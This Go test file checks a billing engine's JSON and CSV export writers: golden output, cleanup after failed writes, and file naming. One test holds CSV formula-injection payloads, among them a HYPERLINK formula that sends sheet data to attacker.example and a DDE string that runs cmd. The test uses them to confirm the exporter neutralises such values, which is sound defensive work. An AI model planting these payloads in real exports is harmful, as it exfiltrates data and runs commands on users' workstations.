package export_test

import (
	"bytes"
	"encoding/csv"
	"encoding/json"
	"errors"
	"io/fs"
	"maps"
	"os"
	"path/filepath"
	"reflect"
	"slices"
	"strings"
	"syscall"
	"testing"
	"time"

	"github.com/google/uuid"
	"github.com/shopspring/decimal"

	"github.com/b42labs/tally/internal/engine/corrections"
	"github.com/b42labs/tally/internal/engine/export"
	"github.com/b42labs/tally/internal/engine/runs"
	"github.com/b42labs/tally/internal/engine/source"
	"github.com/b42labs/tally/internal/engine/statements"
)

// The two runs the cases export. The regular one is the finalized March run of
// the concept's power-cycle example, and the correction is the run that credits
// it: the credit note fixture names the regular run under corrects_run_id, so
// the two read as one month rather than as two unrelated exports.
var (
	regularRunID    = uuid.MustParse("3f1e6a58-9c24-4d0b-8f77-2a5c1b93e0d4")
	correctionRunID = uuid.MustParse("4b9d2c17-6e85-4f3a-8a01-c5d4e6f7a8b9")
)

// The relations the kickback cases settle under. A kickback is keyed by the
// relation it came from, so the ids are written out rather than generated: a
// case names which relation a difference belongs to, and the diff orders them
// by their bytes.
var (
	relation1 = uuid.MustParse("11111111-1111-1111-1111-111111111111")
	relation2 = uuid.MustParse("22222222-2222-2222-2222-222222222222")
	relation3 = uuid.MustParse("33333333-3333-3333-3333-333333333333")
	relation4 = uuid.MustParse("44444444-4444-4444-4444-444444444444")
	relation5 = uuid.MustParse("55555555-5555-5555-5555-555555555555")
)

// The month both runs bill, and the two instants the instance was powered off
// between.
var (
	periodFrom = time.Date(2026, 3, 1, 0, 0, 0, 0, time.UTC)
	poweredOff = time.Date(2026, 3, 11, 0, 0, 0, 0, time.UTC)
	poweredOn  = time.Date(2026, 3, 21, 0, 0, 0, 0, time.UTC)
	periodTo   = time.Date(2026, 4, 1, 0, 0, 0, 0, time.UTC)
)

// instance is the resource every rated record and every delta below belongs to.
var instance = source.Resource{
	Cloud:        "os-prod",
	Platform:     "openstack",
	ResourceType: "instance",
	ResourceID:   "abc-123",
}

// The project that owned the instance, the key its documents are stored under,
// and the currency the month was rated in.
const (
	projectID    = "proj-456"
	statementKey = "os-prod/proj-456"
	currency     = "EUR"
)

// A second project, in a second cloud, that the regular run also billed. The
// point of the JSON writer is fanning one run out over one document per pair
// plus an index that names every one of them, and a run carrying a single
// statement leaves that fan-out untested: a writer that wrote the last document
// only, or one that emitted index entries in an order no reader finds the files
// in, would pass every case.
const (
	drStatementKey  = "os-dr/proj-789"
	drStatementFile = "statement-os-dr%2Fproj-789.json"
)

// drDocument is what the statements package stored for that second project: one
// volume over one period, which is a document of its own rather than a copy of
// the first project's.
const drDocument = `{"billing_period":{"from":"2026-03-01T00:00:00Z","to":"2026-04-01T00:00:00Z"},` +
	`"project_id":"proj-789","platform":"openstack",` +
	`"line_items":[{"resource_type":"volume","resource_id":"vol-789","platform":"openstack",` +
	`"description":"200 GB volume","periods":[{"state":"in-use","hours":744.00,` +
	`"usage":{"disk_gb":200.0000},"cost":{"disk_gb":22.32,"total":22.32},"state_modifier":1.0000}],` +
	`"total":22.32}],"related_costs":[],"total":22.32,"currency":"EUR"}`

// The two header rows, spelled out here rather than read off the writers: the
// column order is what an ERP's import mapping is written against, so a case
// states it rather than agreeing with whatever the code emits.
const (
	ratedHeader = "run_id,kind,corrects_run_id,period_from,period_to,cloud,platform," +
		"resource_type,resource_id,project_id,state,from_ts,to_ts,dimension,quantity,amount,currency"
	deltasHeader = "run_id,corrects_run_id,period_from,period_to,cloud,platform," +
		"resource_type,resource_id,project_id,dimension,old_amount,new_amount,delta,currency"
)

// The file names the two writers produce over the fixtures.
const (
	runFile        = "run.json"
	statementFile  = "statement-os-prod%2Fproj-456.json"
	creditNoteFile = "credit-note-os-prod%2Fproj-456.json"
	ratedFile      = "rated.csv"
	deltasFile     = "deltas.csv"
)

// regularRun is the finalized run of the concept's power-cycle month: the
// statement the statements package rendered for the project, and the twelve
// rated records its three periods times four dimensions produced.
func regularRun(t *testing.T) export.Run {
	t.Helper()

	return export.Run{
		ID:             regularRunID,
		Kind:           runs.KindRegular,
		PeriodFrom:     periodFrom,
		PeriodTo:       periodTo,
		Status:         "finalized",
		PricingVersion: "2026-03",
		Clouds:         []string{},
		StartedAt:      time.Date(2026, 4, 4, 0, 0, 0, 0, time.UTC),
		CompletedAt:    time.Date(2026, 4, 4, 0, 1, 0, 0, time.UTC),
		Stats:          json.RawMessage("{}"),
		// In the order ListProjectStatements returns them, which is by key:
		// os-dr sorts before os-prod.
		Statements: []statements.Statement{{
			Key:      drStatementKey,
			Document: []byte(drDocument),
			Total:    decimal.RequireFromString("22.32"),
			Currency: currency,
		}, {
			Key:      statementKey,
			Document: fixture(t, "statements", "power_cycle.json"),
			Total:    decimal.RequireFromString("128.45"),
			Currency: currency,
		}},
		Rated: ratedRecords(),
	}
}

// correctionRun is the run that credits the month above: the credit note the
// corrections package rendered, the same rated records re-rated under the
// correction, and the three deltas the power cycle produced.
func correctionRun(t *testing.T) export.Run {
	t.Helper()

	return export.Run{
		ID:             correctionRunID,
		Kind:           runs.KindCorrection,
		CorrectsRunID:  regularRunID,
		PeriodFrom:     periodFrom,
		PeriodTo:       periodTo,
		Status:         "finalized",
		PricingVersion: "2026-03",
		Clouds:         []string{},
		StartedAt:      time.Date(2026, 4, 10, 0, 0, 0, 0, time.UTC),
		CompletedAt:    time.Date(2026, 4, 10, 0, 1, 0, 0, time.UTC),
		Stats:          json.RawMessage("{}"),
		Statements: []statements.Statement{{
			Key:      statementKey,
			Document: fixture(t, "corrections", "credit_note_power_cycle.json"),
			Total:    decimal.RequireFromString("-24.00"),
			Currency: currency,
		}},
		Rated:  ratedRecords(),
		Deltas: deltas(),
	}
}

// ratedRecords is what the month billed the instance for: the three periods the
// power cycle split it into, each rated on all four dimensions the model
// prices, in the order ListRatedRecords returns them, which is by the start of
// the usage record and then by dimension.
func ratedRecords() []export.RatedRecord {
	return []export.RatedRecord{
		rated(periodFrom, poweredOff, "active", "disk_gb", "80.0000", "19.20"),
		rated(periodFrom, poweredOff, "active", "egress_gb", "18.0000", "1.62"),
		rated(periodFrom, poweredOff, "active", "ram_gb", "8.0000", "9.60"),
		rated(periodFrom, poweredOff, "active", "vcpus", "4.0000", "19.20"),
		rated(poweredOff, poweredOn, "shutoff", "disk_gb", "80.0000", "9.60"),
		rated(poweredOff, poweredOn, "shutoff", "egress_gb", "0.0000", "0.00"),
		rated(poweredOff, poweredOn, "shutoff", "ram_gb", "8.0000", "4.80"),
		rated(poweredOff, poweredOn, "shutoff", "vcpus", "4.0000", "9.60"),
		rated(poweredOn, periodTo, "active", "disk_gb", "80.0000", "21.12"),
		rated(poweredOn, periodTo, "active", "egress_gb", "22.5000", "2.03"),
		rated(poweredOn, periodTo, "active", "ram_gb", "8.0000", "10.56"),
		rated(poweredOn, periodTo, "active", "vcpus", "4.0000", "21.12"),
	}
}

// rated is one rated record of the instance.
func rated(from, to time.Time, state, dimension, quantity, amount string) export.RatedRecord {
	return export.RatedRecord{
		Resource:  instance,
		ProjectID: projectID,
		State:     state,
		FromTS:    from,
		ToTS:      to,
		Dimension: dimension,
		Quantity:  decimal.RequireFromString(quantity),
		Amount:    decimal.RequireFromString(amount),
		Currency:  currency,
	}
}

// deltas is what the correction credits the project for, in the order
// corrections.Diff sorts them. Every one of them is negative: the late power
// cycle revealed ten days the finalized run billed at the full rate.
func deltas() []export.Delta {
	return []export.Delta{
		delta("disk_gb", "59.52", "49.92", "-9.60"),
		delta("ram_gb", "29.76", "24.96", "-4.80"),
		delta("vcpus", "59.52", "49.92", "-9.60"),
	}
}

// delta is one correction delta of the instance.
func delta(dimension, old, current, difference string) export.Delta {
	return export.Delta{
		Delta: corrections.Delta{
			Key: corrections.Key{
				Cloud:        instance.Cloud,
				Platform:     instance.Platform,
				ResourceType: instance.ResourceType,
				ResourceID:   instance.ResourceID,
				ProjectID:    projectID,
				Dimension:    dimension,
			},
			Old:   decimal.RequireFromString(old),
			New:   decimal.RequireFromString(current),
			Delta: decimal.RequireFromString(difference),
		},
		Currency: currency,
	}
}

// kickback is one settled kickback, as the cases hand them around. The
// statement key is rendered from the pair rather than passed beside it, which
// is what the diff groups by.
func kickback(beneficiary, cloud, projectID string, relationID uuid.UUID,
	scope, rate, base, amount string,
) export.Kickback {
	return export.Kickback{
		Beneficiary:  beneficiary,
		Currency:     currency,
		StatementKey: statements.Key(cloud, projectID),
		Cloud:        cloud,
		ProjectID:    projectID,
		RelationID:   relationID,
		Scope:        scope,
		Rate:         decimal.RequireFromString(rate),
		Base:         decimal.RequireFromString(base),
		Amount:       decimal.RequireFromString(amount),
	}
}

// kickbackRow is one kickback as a case compares it: every column, at the scale
// it is stored at. Two decimals that are the same number are not the same
// decimal.Decimal, so the comparison is over what they render as.
type kickbackRow struct {
	beneficiary, cloud, projectID, relation, scope string
	rate, base, amount, currency                   string
}

// kickbackRows renders what a load or a diff returned, in the order it came
// back in.
func kickbackRows(kickbacks []export.Kickback) []kickbackRow {
	rows := make([]kickbackRow, 0, len(kickbacks))
	for _, entry := range kickbacks {
		rows = append(rows, kickbackRow{
			beneficiary: entry.Beneficiary,
			cloud:       entry.Cloud,
			projectID:   entry.ProjectID,
			relation:    entry.RelationID.String(),
			scope:       entry.Scope,
			rate:        entry.Rate.StringFixed(6),
			base:        entry.Base.StringFixed(2),
			amount:      entry.Amount.StringFixed(2),
			currency:    entry.Currency,
		})
	}
	return rows
}

// fixture reads a document another package's golden holds, so the bytes an
// export renders are the bytes that package stored.
func fixture(t *testing.T, pkg, name string) []byte {
	t.Helper()

	body, err := os.ReadFile(filepath.Join("..", pkg, "testdata", name))
	if err != nil {
		t.Fatalf("reading the fixture document: %v", err)
	}
	return body
}

// TestExportGolden pins the bytes both writers produce over both fixture runs.
// The files are what an ERP imports, so a change to a name, a column, a field
// order or a scale is a change to somebody's import: it has to show up here
// rather than in their next invoice run.
func TestExportGolden(t *testing.T) {
	cases := []struct {
		name   string
		writer func(dir string) export.BillingExporter
		run    func(t *testing.T) export.Run
		golden string
		files  []string
	}{
		{
			name:   "the JSON writer over a regular run",
			writer: jsonFiles,
			run:    regularRun,
			golden: "regular",
			files:  []string{runFile, drStatementFile, statementFile},
		},
		{
			name:   "the CSV writer over a regular run",
			writer: csvFiles,
			run:    regularRun,
			golden: "regular",
			files:  []string{ratedFile},
		},
		{
			name:   "the JSON writer over a correction",
			writer: jsonFiles,
			run:    correctionRun,
			golden: "correction",
			files:  []string{runFile, creditNoteFile},
		},
		{
			name:   "the CSV writer over a correction",
			writer: csvFiles,
			run:    correctionRun,
			golden: "correction",
			files:  []string{ratedFile, deltasFile},
		},
	}

	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			dir := t.TempDir()
			if err := c.writer(dir).Export(t.Context(), c.run(t)); err != nil {
				t.Fatalf("Export() error = %v, want nil", err)
			}
			assertGolden(t, dir, c.golden, c.files)
		})
	}
}

// TestExportReplacesAnEarlierExport pins what exporting one run into one
// directory twice does. The second pass has to produce the bytes of the first,
// and it has to write over what is there rather than beside it: an operator who
// re-exports a month reads that month, not a mix of two passes.
func TestExportReplacesAnEarlierExport(t *testing.T) {
	cases := []struct {
		name   string
		writer func(dir string) export.BillingExporter
		stale  string
		files  []string
	}{
		{
			name: "the JSON writer", writer: jsonFiles, stale: runFile,
			files: []string{runFile, drStatementFile, statementFile},
		},
		{name: "the CSV writer", writer: csvFiles, stale: ratedFile, files: []string{ratedFile}},
	}

	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			dir := filepath.Join(t.TempDir(), "out")
			writer := c.writer(dir)
			run := regularRun(t)

			if err := writer.Export(t.Context(), run); err != nil {
				t.Fatalf("the first Export() error = %v, want nil", err)
			}
			first := readAll(t, dir, c.files)

			// What an earlier export of another run left under the same name. The
			// rename replaces it whole, so nothing of it survives into the file the
			// second pass writes.
			stale := []byte("what an older export of another run left behind\n")
			if err := os.WriteFile(filepath.Join(dir, c.stale), stale, 0o600); err != nil {
				t.Fatalf("planting the stale file: %v", err)
			}

			if err := writer.Export(t.Context(), run); err != nil {
				t.Fatalf("the second Export() error = %v, want nil", err)
			}
			second := readAll(t, dir, c.files)

			if !maps.Equal(first, second) {
				t.Errorf("the second export differs from the first: %v", diff(first, second))
			}
			assertNames(t, dir, c.files)
		})
	}
}

// TestJSONFilesWithoutStatements pins what a run that billed nobody exports: a
// run.json whose statement list is empty rather than null, and no document
// beside it. An empty list is one an importer iterates over without a case for
// the missing value.
func TestJSONFilesWithoutStatements(t *testing.T) {
	dir := t.TempDir()
	run := regularRun(t)
	run.Statements = nil

	if err := jsonFiles(dir).Export(t.Context(), run); err != nil {
		t.Fatalf("Export() error = %v, want nil", err)
	}

	assertNames(t, dir, []string{runFile})
	if body := string(read(t, filepath.Join(dir, runFile))); !strings.Contains(body, `"statements": []`) {
		t.Errorf("%s =\n%s\nwant an empty statement list", runFile, body)
	}
}

// TestCSVFilesWithoutRows pins the header-only tables. A run that billed
// nothing, and a correction that changed nothing, write their files all the
// same: an empty table says the run produced no rows, and a missing file says
// nothing at all.
func TestCSVFilesWithoutRows(t *testing.T) {
	t.Run("a regular run with no rated records", func(t *testing.T) {
		dir := t.TempDir()
		run := regularRun(t)
		run.Rated = nil

		if err := csvFiles(dir).Export(t.Context(), run); err != nil {
			t.Fatalf("Export() error = %v, want nil", err)
		}

		assertNames(t, dir, []string{ratedFile})
		if got, want := string(read(t, filepath.Join(dir, ratedFile))), ratedHeader+"\n"; got != want {
			t.Errorf("%s = %q, want %q", ratedFile, got, want)
		}
	})

	t.Run("a correction with no deltas", func(t *testing.T) {
		dir := t.TempDir()
		run := correctionRun(t)
		run.Deltas = nil

		if err := csvFiles(dir).Export(t.Context(), run); err != nil {
			t.Fatalf("Export() error = %v, want nil", err)
		}

		assertNames(t, dir, []string{deltasFile, ratedFile})
		if got, want := string(read(t, filepath.Join(dir, deltasFile))), deltasHeader+"\n"; got != want {
			t.Errorf("%s = %q, want %q", deltasFile, got, want)
		}
	})
}

// TestCSVFilesQuotesTheSeparator pins that a value holding the separator
// survives the round trip. Resource ids come from a cloud rather than from the
// engine, and one holding a comma has to reach an importer as the one field it
// is rather than as two.
func TestCSVFilesQuotesTheSeparator(t *testing.T) {
	dir := t.TempDir()
	run := regularRun(t)
	record := run.Rated[0]
	record.Resource.ResourceID = "abc,123"
	run.Rated = []export.RatedRecord{record}

	if err := csvFiles(dir).Export(t.Context(), run); err != nil {
		t.Fatalf("Export() error = %v, want nil", err)
	}

	file, err := os.Open(filepath.Join(dir, ratedFile))
	if err != nil {
		t.Fatalf("opening %s: %v", ratedFile, err)
	}
	defer func() { _ = file.Close() }()

	rows, err := csv.NewReader(file).ReadAll()
	if err != nil {
		t.Fatalf("reading %s back: %v", ratedFile, err)
	}
	if len(rows) != 2 {
		t.Fatalf("%s holds %d rows, want the header and one record", ratedFile, len(rows))
	}
	// Column nine is resource_id. csv.Reader holds every row to the header's
	// field count, so a separator that leaked would have failed the read above.
	if got := rows[1][8]; got != "abc,123" {
		t.Errorf("resource_id = %q, want %q", got, "abc,123")
	}
}

// TestCSVFilesRefusesAFormulaToTheSpreadsheet pins what the identifier columns
// carry. Every one of them is free text a collector's event stream carried in,
// bounded by nothing but a length, and rated.csv is written to be imported into
// an ERP and opened in Excel or LibreOffice, where a value that starts with =,
// +, -, @, a tab or a carriage return is evaluated as a formula: HYPERLINK and
// WEBSERVICE exfiltrate the sheet, and DDE runs a command on the finance
// workstation. Quoting is not the answer, because both applications strip the
// quotes and evaluate what is inside, which is why the value is prefixed with
// the apostrophe both of them read as "this is text".
func TestCSVFilesRefusesAFormulaToTheSpreadsheet(t *testing.T) {
	// One payload per prefix a spreadsheet evaluates on, in the column an event
	// carried it into.
	const (
		formula  = `=HYPERLINK("http://attacker.example/"&A1,"invoice")`
		command  = `@SUM(1+9)*cmd|' /c calc'!A1`
		plus     = "+1+1"
		minus    = "-1+1"
		tabbed   = "\t=1+1"
		returned = "\r=1+1"
	)

	cases := []struct {
		name   string
		column int
		set    func(record *export.RatedRecord, value string)
	}{
		{name: "cloud", column: 5, set: func(r *export.RatedRecord, v string) { r.Resource.Cloud = v }},
		{name: "platform", column: 6, set: func(r *export.RatedRecord, v string) { r.Resource.Platform = v }},
		{name: "resource_type", column: 7, set: func(r *export.RatedRecord, v string) { r.Resource.ResourceType = v }},
		{name: "resource_id", column: 8, set: func(r *export.RatedRecord, v string) { r.Resource.ResourceID = v }},
		{name: "project_id", column: 9, set: func(r *export.RatedRecord, v string) { r.ProjectID = v }},
		{name: "state", column: 10, set: func(r *export.RatedRecord, v string) { r.State = v }},
		{name: "dimension", column: 13, set: func(r *export.RatedRecord, v string) { r.Dimension = v }},
	}

	for _, c := range cases {
		for _, value := range []string{formula, command, plus, minus, tabbed, returned} {
			t.Run(c.name+" holding "+value, func(t *testing.T) {
				dir := t.TempDir()
				run := regularRun(t)
				record := run.Rated[0]
				c.set(&record, value)
				run.Rated = []export.RatedRecord{record}

				if err := csvFiles(dir).Export(t.Context(), run); err != nil {
					t.Fatalf("Export() error = %v, want nil", err)
				}

				rows := readCSV(t, filepath.Join(dir, ratedFile))
				if len(rows) != 2 {
					t.Fatalf("%s holds %d rows, want the header and one record", ratedFile, len(rows))
				}
				// The value reaches an importer whole, under the prefix that keeps a
				// spreadsheet from evaluating it.
				if got, want := rows[1][c.column], "'"+value; got != want {
					t.Errorf("%s = %q, want %q", c.name, got, want)
				}
			})
		}
	}

	t.Run("a value no spreadsheet evaluates is carried as it is", func(t *testing.T) {
		dir := t.TempDir()
		if err := csvFiles(dir).Export(t.Context(), regularRun(t)); err != nil {
			t.Fatalf("Export() error = %v, want nil", err)
		}

		rows := readCSV(t, filepath.Join(dir, ratedFile))
		if got, want := rows[1][8], instance.ResourceID; got != want {
			t.Errorf("resource_id = %q, want %q", got, want)
		}
	})

	t.Run("a delta's identifiers are prefixed too", func(t *testing.T) {
		dir := t.TempDir()
		run := correctionRun(t)
		entry := run.Deltas[0]
		entry.ResourceID = formula
		run.Deltas = []export.Delta{entry}

		if err := csvFiles(dir).Export(t.Context(), run); err != nil {
			t.Fatalf("Export() error = %v, want nil", err)
		}

		rows := readCSV(t, filepath.Join(dir, deltasFile))
		if len(rows) != 2 {
			t.Fatalf("%s holds %d rows, want the header and one delta", deltasFile, len(rows))
		}
		// Column seven is resource_id of the deltas header.
		if got, want := rows[1][7], "'"+formula; got != want {
			t.Errorf("resource_id = %q, want %q", got, want)
		}
	})

	t.Run("the delta of a credit keeps its minus", func(t *testing.T) {
		dir := t.TempDir()
		if err := csvFiles(dir).Export(t.Context(), correctionRun(t)); err != nil {
			t.Fatalf("Export() error = %v, want nil", err)
		}

		rows := readCSV(t, filepath.Join(dir, deltasFile))
		// Column twelve is delta. It is a number, so it does not go through the
		// prefix: a leading minus there is the sign of the credit.
		if got, want := rows[1][12], "-9.60"; got != want {
			t.Errorf("delta = %q, want %q", got, want)
		}
	})
}

// TestJSONFilesNamesTwoStatementsOneFileSystemHoldsAsOneApart pins what two
// keys that differ only in ASCII case export to. The names keep that case, and
// APFS, SMB and NTFS resolve both to one file, so the second rename would
// replace the first project's document while run.json went on naming both: one
// project billed twice, the other not at all, and no error anywhere. A project
// id is free text, so the pair is valid input rather than a corrupt one: the
// second document takes its digest name, which no fold collides with, and the
// month is exported rather than refused over one file name.
func TestJSONFilesNamesTwoStatementsOneFileSystemHoldsAsOneApart(t *testing.T) {
	dir := filepath.Join(t.TempDir(), "out")
	run := regularRun(t)
	document := fixture(t, "statements", "power_cycle.json")
	run.Statements = []statements.Statement{{
		Key:      statements.Key("os-prod", "Proj-A"),
		Document: document,
		Total:    decimal.RequireFromString("1.00"),
		Currency: currency,
	}, {
		Key:      statements.Key("os-prod", "proj-a"),
		Document: document,
		Total:    decimal.RequireFromString("2.00"),
		Currency: currency,
	}}

	if err := jsonFiles(dir).Export(t.Context(), run); err != nil {
		t.Fatalf("Export() error = %v, want nil", err)
	}

	var index struct {
		Statements []struct {
			File      string      `json:"file"`
			ProjectID string      `json:"project_id"`
			Total     json.Number `json:"total"`
		} `json:"statements"`
	}
	if err := json.Unmarshal(read(t, filepath.Join(dir, runFile)), &index); err != nil {
		t.Fatalf("decoding %s: %v", runFile, err)
	}
	if len(index.Statements) != 2 {
		t.Fatalf("%s names %d statements, want both of the pair", runFile, len(index.Statements))
	}
	first, second := index.Statements[0], index.Statements[1]

	// Only the second of the pair gives up the name its key renders, and what it
	// takes instead is one no fold of the first collides with.
	if want := export.DocumentFileName(runs.KindRegular, run.Statements[0].Key); first.File != want {
		t.Errorf("%s names the file %q, want %q", runFile, first.File, want)
	}
	if strings.EqualFold(first.File, second.File) {
		t.Errorf("%s names %q and %q, which are one file on a case-insensitive filesystem",
			runFile, first.File, second.File)
	}
	// Both documents are in the directory, and each of them is attributed by the
	// index rather than by its name: a digest-named document bills the project
	// run.json names beside it.
	assertNames(t, dir, []string{runFile, first.File, second.File})
	for i, want := range []struct{ projectID, total string }{
		{projectID: "Proj-A", total: "1.00"},
		{projectID: "proj-a", total: "2.00"},
	} {
		if entry := index.Statements[i]; entry.ProjectID != want.projectID || entry.Total.String() != want.total {
			t.Errorf("%s names the project %q with the total %s under %q, want %q and %s",
				runFile, entry.ProjectID, entry.Total, entry.File, want.projectID, want.total)
		}
	}
}

// TestJSONFilesRendersTheAbsentValuesAsNull pins what run.json carries for a run
// whose row holds NULL under the three nullable columns. A regular run corrects
// nothing, a run of a period no model priced carries no version, and a run that
// did not get to the end of its pass has no completion: each of them renders as
// null rather than as an empty string, or as the zero timestamp an ERP would
// read as a real completion date.
func TestJSONFilesRendersTheAbsentValuesAsNull(t *testing.T) {
	dir := t.TempDir()
	run := regularRun(t)
	run.PricingVersion = ""
	run.CompletedAt = time.Time{}

	if err := jsonFiles(dir).Export(t.Context(), run); err != nil {
		t.Fatalf("Export() error = %v, want nil", err)
	}

	body := string(read(t, filepath.Join(dir, runFile)))
	for _, want := range []string{
		`"corrects_run_id": null`,
		`"pricing_version": null`,
		`"completed_at": null`,
	} {
		if !strings.Contains(body, want) {
			t.Errorf("%s =\n%s\nwant it to carry %s", runFile, body, want)
		}
	}
}

// TestExportRemovesWhatItWroteWhenAWriteFails pins what a directory holds after
// a write that failed halfway. The volume filling up, a quota running out, or a
// name the filesystem refuses all land here, and a drop directory left holding
// the documents up to the bad one, with no index beside them, is one an ERP
// bills those projects from without anything saying the rest are missing.
func TestExportRemovesWhatItWroteWhenAWriteFails(t *testing.T) {
	cases := []struct {
		name    string
		writer  func(dir string) export.BillingExporter
		run     func(t *testing.T) export.Run
		blocked string
		removed string
	}{
		{
			name:    "the JSON writer over a run of two statements",
			writer:  jsonFiles,
			run:     regularRun,
			blocked: statementFile,
			removed: drStatementFile,
		},
		{
			name:    "the JSON writer over an index that fails",
			writer:  jsonFiles,
			run:     regularRun,
			blocked: runFile,
			removed: statementFile,
		},
		{
			name:    "the CSV writer over a correction",
			writer:  csvFiles,
			run:     correctionRun,
			blocked: deltasFile,
			removed: ratedFile,
		},
	}

	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			dir := t.TempDir()
			// A directory under the name the second file takes: the rename onto it
			// fails the way a full volume fails, and it fails after the first file
			// is already in place.
			if err := os.Mkdir(filepath.Join(dir, c.blocked), 0o700); err != nil {
				t.Fatalf("blocking %s: %v", c.blocked, err)
			}

			err := c.writer(dir).Export(t.Context(), c.run(t))
			if err == nil {
				t.Fatalf("Export() error = nil, want the blocked write reported")
			}
			if want := "writing " + filepath.Join(dir, c.blocked) + ":"; !strings.Contains(err.Error(), want) {
				t.Errorf("Export() error = %v, want it to name %q", err, want)
			}
			// Only what was planted is left: the file the export had already
			// written is gone, and so is every temporary file.
			assertNames(t, dir, []string{c.blocked})
		})
	}
}

// TestExportRemovesWhatItWroteWhenTheDirectorySyncFails pins that the sync of
// the output directory is under the same rule as every other write: an export
// that reports an error leaves nothing behind. The sync fails after every
// document and the index are renamed into place, so what it would leave is a
// complete, importable export beside a non-zero exit — the ERP bills the month
// off the drop directory while the operator, told the export failed, re-runs
// it, and the month is billed twice. EIO from a device that reports a writeback
// error once, ENOSPC from delayed allocation, and EIO or EPERM from the FUSE
// daemon behind a mounted drop directory all land here.
func TestExportRemovesWhatItWroteWhenTheDirectorySyncFails(t *testing.T) {
	if os.Geteuid() == 0 {
		t.Skip("root opens a directory whose mode forbids it")
	}

	for _, c := range writers() {
		t.Run(c.name, func(t *testing.T) {
			dir := t.TempDir()
			// Write and search, without read: creating, renaming and removing a
			// name in the directory all work, and the open the sync needs does
			// not. It is the one failure of the sync a test can ask for.
			if err := os.Chmod(dir, 0o300); err != nil {
				t.Fatalf("closing the directory to reads: %v", err)
			}
			// TempDir removes the directory when the test ends, which the mode
			// above forbids. Cleanups run in reverse order, so this one is first.
			t.Cleanup(func() { _ = os.Chmod(dir, 0o700) })

			err := c.writer(dir).Export(t.Context(), regularRun(t))
			if err == nil {
				t.Fatalf("Export() error = nil, want the directory sync reported")
			}
			if want := "writing the output directory " + dir + ":"; !strings.Contains(err.Error(), want) {
				t.Errorf("Export() error = %v, want it to name %q", err, want)
			}

			if err := os.Chmod(dir, 0o700); err != nil {
				t.Fatalf("re-opening the directory to reads: %v", err)
			}
			assertNames(t, dir, nil)
		})
	}
}

// TestDocumentFileName pins the names documents are written under: which kind
// of document a file holds, and that two projects never meet in one name. The
// key of a statement escapes its two halves, and the file name escapes that key
// again, which is what keeps the pairs apart.
func TestDocumentFileName(t *testing.T) {
	t.Run("a regular run writes statements", func(t *testing.T) {
		got := export.DocumentFileName(runs.KindRegular, statementKey)
		if got != statementFile {
			t.Errorf("DocumentFileName() = %q, want %q", got, statementFile)
		}
	})

	t.Run("a correction writes credit notes", func(t *testing.T) {
		got := export.DocumentFileName(runs.KindCorrection, statementKey)
		if got != creditNoteFile {
			t.Errorf("DocumentFileName() = %q, want %q", got, creditNoteFile)
		}
	})

	t.Run("two pairs that hold a slash get two names", func(t *testing.T) {
		// The cloud carries the separator in the first pair and the project in the
		// second. Both render one key, and the keys render one name each.
		first := export.DocumentFileName(runs.KindRegular, statements.Key("os-prod/a", "b"))
		second := export.DocumentFileName(runs.KindRegular, statements.Key("os-prod", "a/b"))

		if want := "statement-os-prod%252Fa%2Fb.json"; first != want {
			t.Errorf("DocumentFileName() = %q, want %q", first, want)
		}
		if want := "statement-os-prod%2Fa%252Fb.json"; second != want {
			t.Errorf("DocumentFileName() = %q, want %q", second, want)
		}
		if first == second {
			t.Errorf("both pairs render %q, want one name each", first)
		}
	})

	t.Run("a key past what a file name holds is named after its digest", func(t *testing.T) {
		// nameMax is what POSIX guarantees a file name holds, and what ext4, XFS
		// and APFS all give. os.CreateTemp appends a pattern to the name before
		// the rename, so a name has to stay under it with room to spare.
		const nameMax = 255

		first := export.DocumentFileName(runs.KindRegular, statements.Key("os-prod", strings.Repeat("p", 500)))
		second := export.DocumentFileName(runs.KindRegular, statements.Key("os-prod", strings.Repeat("q", 500)))
		note := export.DocumentFileName(runs.KindCorrection, statements.Key("os-prod", strings.Repeat("p", 500)))

		for _, got := range []string{first, second, note} {
			if len(got) >= nameMax {
				t.Errorf("DocumentFileName() = %q, which is %d bytes and past the %d a name holds",
					got, len(got), nameMax)
			}
			if !strings.HasSuffix(got, ".json") {
				t.Errorf("DocumentFileName() = %q, want it to end in .json", got)
			}
		}
		if first == second {
			t.Errorf("two project ids render %q, want one name each", first)
		}
		// The prefix still says which of the two kinds of document a file holds.
		if !strings.HasPrefix(first, "statement-") || !strings.HasPrefix(note, "credit-note-") {
			t.Errorf("DocumentFileName() = %q and %q, want the statement and the credit note prefix",
				first, note)
		}
		// The name is a function of the key: exporting one finalized run twice
		// yields the same file either way.
		if again := export.DocumentFileName(runs.KindRegular, statements.Key("os-prod",
			strings.Repeat("p", 500))); again != first {
			t.Errorf("DocumentFileName() = %q on the second call, want the %q of the first", again, first)
		}
	})
}

// TestJSONFilesWritesAnIdentifierNoFileNameHolds pins that one over-long
// project id costs an export nothing. Ingest bounds a project id at 512
// characters and nothing bounds it further, while the escaping the file name
// goes through multiplies it and NAME_MAX is 255 bytes: without a fallback the
// document's temporary file is refused with ENAMETOOLONG, and every JSON export
// of every run that bills that project dies, with no way to get the other
// statements of the month out. The digest is what keeps the month exportable,
// and run.json names the cloud and the project id beside the file, so the pair
// such a document bills is still read off the index.
func TestJSONFilesWritesAnIdentifierNoFileNameHolds(t *testing.T) {
	dir := t.TempDir()
	longProjectID := strings.Repeat("p", 500)
	run := regularRun(t)
	run.Statements = []statements.Statement{{
		Key:      statements.Key("os-prod", longProjectID),
		Document: fixture(t, "statements", "power_cycle.json"),
		Total:    decimal.RequireFromString("128.45"),
		Currency: currency,
	}}

	if err := jsonFiles(dir).Export(t.Context(), run); err != nil {
		t.Fatalf("Export() error = %v, want nil", err)
	}

	files := names(t, dir)
	if len(files) != 2 {
		t.Fatalf("the directory holds %v, want run.json and the one document", files)
	}
	var index struct {
		Statements []struct {
			File      string `json:"file"`
			Cloud     string `json:"cloud"`
			ProjectID string `json:"project_id"`
		} `json:"statements"`
	}
	if err := json.Unmarshal(read(t, filepath.Join(dir, runFile)), &index); err != nil {
		t.Fatalf("decoding %s: %v", runFile, err)
	}
	if len(index.Statements) != 1 {
		t.Fatalf("%s names %d statements, want one", runFile, len(index.Statements))
	}
	entry := index.Statements[0]
	if entry.Cloud != "os-prod" || entry.ProjectID != longProjectID {
		t.Errorf("%s names the pair %q, %q, want %q and the project id the statement carries",
			runFile, entry.Cloud, entry.ProjectID, "os-prod")
	}
	if _, err := os.Stat(filepath.Join(dir, entry.File)); err != nil {
		t.Errorf("os.Stat(%s) error = %v, want the document the index points at", entry.File, err)
	}
}

